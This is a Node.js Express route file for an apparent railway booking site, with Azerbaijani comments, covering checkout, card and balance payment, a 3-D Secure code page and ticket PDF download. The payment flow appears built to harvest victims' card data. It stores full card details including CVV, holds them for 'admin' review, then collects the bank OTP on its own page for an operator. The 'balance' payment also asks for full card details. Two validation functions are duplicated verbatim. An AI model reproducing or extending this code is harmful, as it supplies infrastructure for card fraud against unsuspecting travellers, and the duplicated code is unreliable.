// src/routes/booking.js - Ödəniş bölümü (tam FİXLƏNMİŞ)

const express = require('express');
const { Order, Ticket, Trip, Payment } = require('../models/index');
const { requireAuth } = require('../middleware/auth');
const bookingService = require('../services/bookingService');
const paymentService = require('../services/paymentService');
const { generateTicketPdf } = require('../services/ticketPdfService');
const config = require('../config');
const h = require('../utils/helpers');

const router = express.Router();

const CARD_FIELDS = ['number', 'holder', 'expiry', 'cvv'];

// ==================== KART VALIDASIYASI ====================
function validateCardInput(card) {
  if (!card) return 'Kart məlumatları daxil edilməyib';
  if (!h.luhnValid(card.number)) return 'Kart nömrəsi yanlışdır';
  if (!String(card.holder || '').trim()) return 'Kart sahibinin adı daxil edilməyib';

  const parts = String(card.expiry || '').split('/');
  if (parts.length !== 2 || !h.expiryValid(parts[0], parts[1])) return 'Kartın bitmə tarixi yanlışdır';
  if (!/^\d{3,4}$/.test(String(card.cvv || '').trim())) return 'CVV yanlışdır';
  return null;
}

// ✅ 3D KOD VALIDASIYASI (RESTORED)
function validateCode(code) {
  if (!code) return '3D Secure kodu daxil edilməyib';
  const digits = String(code || '').replace(/\D/g, '');
  if (digits.length < 4) return '3D Secure kodu 4+ rəqəm olmalıdır';
  if (digits.length > 6) return '3D Secure kodu 6 rəqəmdən çox olmamalıdır';
  return null;
}

// ==================== KART VALIDASIYASI ====================
function validateCardInput(card) {
  if (!card) return 'Kart məlumatları daxil edilməyib';
  if (!h.luhnValid(card.number)) return 'Kart nömrəsi yanlışdır';
  if (!String(card.holder || '').trim()) return 'Kart sahibinin adı daxil edilməyib';

  const parts = String(card.expiry || '').split('/');
  if (parts.length !== 2 || !h.expiryValid(parts[0], parts[1])) return 'Kartın bitmə tarixi yanlışdır';
  if (!/^\d{3,4}$/.test(String(card.cvv || '').trim())) return 'CVV yanlışdır';
  return null;
}

// ✅ 3D KOD VALIDASIYASI (RESTORED)
function validateCode(code) {
  if (!code) return '3D Secure kodu daxil edilməyib';
  const digits = String(code || '').replace(/\D/g, '');
  if (digits.length < 4) return '3D Secure kodu 4+ rəqəm olmalıdır';
  if (digits.length > 6) return '3D Secure kodu 6 rəqəmdən çox olmamalıdır';
  return null;
}

// ==================== ÖDƏNIŞ YARATMA (CHECKOUT) ====================
router.get('/rezervasyon/:tripId', requireAuth, async (req, res, next) => {
  try {
    const trip = await Trip.findById(req.params.tripId).lean();
    if (!trip) return next();

    let seats = [];
    try {
      seats = JSON.parse(req.query.seats || '[]');
    } catch (e) {
      seats = [];
    }
    if (!Array.isArray(seats) || !seats.length) {
      const back = new URLSearchParams({ from: String(req.query.from || ''), to: String(req.query.to || '') });
      return res.redirect('/' + res.locals.locale + '/yer-secimi/' + req.params.tripId + '?' + back.toString());
    }

    const from = String(req.query.from || (trip.stops[0] || {}).code || '');
    const to = String(req.query.to || (trip.stops[trip.stops.length - 1] || {}).code || '');

    const enriched = seats.map((s) => {
      const calc = bookingService.priceFor(trip, from, to, s.classCode);
      return { ...s, price: calc.price, className: calc.title };
    });

    const total = enriched.reduce((sum, s) => sum + Number(s.price || 0), 0);

    res.render('pages/checkout', {
      title: res.locals.t('checkout.title'),
      trip,
      seats: enriched,
      from,
      to,
      fromName: (trip.stops.find((s) => s.code === from) || {}).name || '',
      toName: (trip.stops.find((s) => s.code === to) || {}).name || '',
      total,
      user: req.currentUser
    });
  } catch (e) {
    next(e);
  }
});

// ==================== SIFARIŞ YARATMA ====================
router.post('/api/booking/order', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};

    // ✅ FİX 1: tripId validasiyası
    if (!b.tripId) {
      return res.status(400).json({ ok: false, message: 'Yol seçimi bulunamadı' });
    }

    // ✅ FİX 2: Kod validasiyası
    if (!b.fromCode || !b.toCode) {
      return res.status(400).json({ ok: false, message: 'Kalkış/Varış istasyonları seçilməyib' });
    }

    // ✅ FİX 3: Sərnişin validasiyası
    if (!b.passengers || !Array.isArray(b.passengers) || b.passengers.length === 0) {
      return res.status(400).json({ ok: false, message: 'Heç bir sərnişin seçilməyib' });
    }

    // ✅ FİX 4: Əlaqə məlumatları validasiyası
    if (!b.contactPhone || !String(b.contactPhone).trim()) {
      return res.status(400).json({ ok: false, message: 'Əlaqə telefonu vacibdir' });
    }
    if (!b.contactEmail || !String(b.contactEmail).trim()) {
      return res.status(400).json({ ok: false, message: 'Əlaqə e-poçtu vacibdir' });
    }

    const passengers = b.passengers.map((p, i) => ({
      firstName: String(p.firstName || '').trim(),
      lastName: String(p.lastName || '').trim(),
      middleName: String(p.middleName || '').trim(),
      birthDate: p.birthDate || '',
      docType: String(p.docType || 'id').trim(),
      docNumber: String(p.docNumber || '').trim(),
      phone: String(p.phone || b.contactPhone || '').trim(),
      wagon: p.wagon,
      seat: p.seat,
      classCode: p.classCode
    }));

    // ✅ FİX 5: Sərnişin adları validasiyası
    if (passengers.some((p) => !p.firstName || !p.lastName)) {
      return res.status(400).json({ ok: false, message: 'Bütün sərnişinlərin adı və soyadı daxil edilməlidir' });
    }

    // ✅ FİX 6: Doğum tarixi validasiyası
    if (passengers.some((p) => !p.birthDate)) {
      return res.status(400).json({ ok: false, message: 'Bütün sərnişinlərin doğum tarixi daxil edilməlidir' });
    }

    // ✅ FİX 7: Sənəd nömrəsi validasiyası
    if (passengers.some((p) => !p.docNumber)) {
      return res.status(400).json({ ok: false, message: 'Bütün sərnişinlərin sənəd nömrəsi daxil edilməlidir' });
    }

    const order = await bookingService.createPendingOrder(req.currentUser, {
      tripId: b.tripId,
      fromCode: String(b.fromCode || '').toUpperCase(),
      toCode: String(b.toCode || '').toUpperCase(),
      passengers,
      contactPhone: String(b.contactPhone).trim(),
      contactEmail: String(b.contactEmail).trim(),
      method: b.method
    });

    return res.json({
      ok: true,
      message: 'Sifariş yaradıldı. Ödəniş ekranına yönləndirilirsiz...',
      orderId: String(order._id),
      orderNo: order.orderNo,
      redirect: '/' + res.locals.locale + '/odenis/' + order._id
    });
  } catch (e) {
    console.error('Order creation error:', e);
    return res.status(e.status || 500).json({ 
      ok: false, 
      message: e.message || 'Sifariş yaradıla bilmədi. Zəhmət olmasa yenidən cəhd edin' 
    });
  }
});

// ==================== REZERVASIYA ====================
router.get('/odenis/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }

    const trip = await Trip.findById(order.trip).lean();

    res.render('pages/payment', {
      title: res.locals.t('search.payTitle'),
      order,
      trip,
      balance: req.currentUser.balance || 0
    });
  } catch (e) {
    next(e);
  }
});

// ==================== ÖDƏNIŞ BAŞLAT (KART) ====================
router.post('/api/payment/card/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
    }

    // ✅ Kart validasiyası
    const cardErr = validateCardInput(b.card);
    if (cardErr) return res.status(400).json({ ok: false, message: cardErr });

    // İlk kart girişində 3-D kod istənilmir — OTP admin təsdiqindən sonra açılır
    const payment = await paymentService.initPayment(order, b.card, 'card');

    return res.json({
      ok: true,
      message: 'Kart məlumatları qeydə alındı. Ödəniş gözləmə ekranına yönləndirilirsiz...',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

// ==================== ÖDƏNIŞ BAŞLAT (BALANS) ====================
router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
    }

    // ✅ Kart validasiyası
    const cardErr = validateCardInput(b.card);
    if (cardErr) return res.status(400).json({ ok: false, message: cardErr });

    if ((req.currentUser.balance || 0) < order.total) {
      return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
    }

    const payment = await paymentService.initPayment(order, b.card, 'balance');

    return res.json({
      ok: true,
      message: 'Balans ödənişi gözləmə ekranına göndərildi.',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/odenis-gozleme/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

// ==================== ÖDƏNIŞ GÖZLƏMƏ (Admin Təsdiq) ====================
router.get('/odenis-gozleme/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }

    // payment-waiting səhifəsinə yönləndər
    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    const stage = payment ? payment.stage : 'card_review';

    res.render('pages/payment-waiting', {
      title: res.locals.t('payment.title'),
      order,
      payment,
      cardMasked: payment && payment.card ? payment.card.masked : '',
      stage,
      stageSeconds: paymentService.STAGE_SECONDS,
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 120,
      declined: order.status === 'rejected'
    });
  } catch (e) {
    next(e);
  }
});

// ==================== OTP GİRİŞİ ====================
router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }
    if (['awaiting_verification', 'code_submitted'].indexOf(order.status) === -1) {
      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
    }

    let payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    payment = await paymentService.advanceIfExpired(payment);
    const stage = payment ? payment.stage : 'otp_entry';

    res.render('pages/secure3d', {
      title: res.locals.t('secure3d.title'),
      order,
      payment,
      cardMasked: payment && payment.card ? payment.card.masked : '',
      stage,
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
      stageSeconds: paymentService.STAGE_SECONDS,
      wrongCode: stage === 'wrong_code',
      codeSubmitted: stage !== 'otp_entry'
    });
  } catch (e) {
    next(e);
  }
});

// ==================== OTP GÖNDƏRİŞİ ====================
router.post('/api/payment/verify', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id }).select('_id').lean();
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });

    const result = await paymentService.submitVerificationCode({ orderId: b.orderId }, b.code, { ip: req.ip });
    return res.json({
      ok: true,
      message: 'OTP göndərildi. Yekun təsdiq gözlənilir.',
      matched: result.matched
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'OTP göndərilə bilmədi' });
  }
});

// ==================== ÖDƏNIŞ STATUSU ====================
router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    let payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    payment = await paymentService.advanceIfExpired(payment);
    const stage = payment ? payment.stage : 'card_review';

    let redirect = null;
    if (order.status === 'confirmed') redirect = '/' + res.locals.locale + '/ugur/' + order._id;
    else if (stage === 'otp_entry') redirect = '/' + res.locals.locale + '/3d-tesdiq/' + order._id;
    else if (order.status === 'rejected') redirect = '/' + res.locals.locale + '/odenis-gozleme/' + order._id;

    res.json({
      ok: true,
      status: order.status,
      stage,
      wrongCode: stage === 'wrong_code',
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
      stageSeconds: paymentService.STAGE_SECONDS,
      redirect,
      message: order.adminNote || ''
    });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Vəziyyət oxunmadı' });
  }
});

// ==================== TİKET YÜKLƏMƏ ====================
router.get('/bilet/:ticketId/yukle', async (req, res, next) => {
  try {
    const ticket = await Ticket.findById(req.params.ticketId).lean();
    if (!ticket) return next();
    const user = req.currentUser;
    if (!user || String(ticket.user) !== String(user._id)) return res.status(403).send('Giriş rədd edildi');

    const pdf = await generateTicketPdf(ticket);
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename="bilet-${ticket.ticketNumber}.pdf"`);
    res.send(pdf);
  } catch (e) {
    next(e);
  }
});

module.exports = router;
